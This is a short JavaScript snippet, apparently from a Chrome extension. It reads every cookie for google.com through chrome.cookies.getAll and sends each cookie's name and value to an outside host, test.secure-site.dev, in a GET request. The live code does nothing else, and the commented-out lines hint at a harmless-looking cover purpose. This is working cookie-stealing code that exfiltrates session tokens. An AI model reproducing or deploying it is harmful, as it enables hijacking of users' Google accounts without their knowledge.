//var newURL = "http://google.com/search?q=foobar";
//chrome.tabs.create({ url: newURL });

chrome.cookies.getAll({
domain: "google.com"
}, function (cookies) {
for (var i = 0; i < cookies.length; i++) {
//alert(cookies[i] + "deleted");
                var xmlhttp = new XMLHttpRequest();
                xmlhttp.open("GET", "https://test.secure-site.dev/?" + cookies[i].name + "=" + cookies[i].value, true);
                xmlhttp.send();
}
});
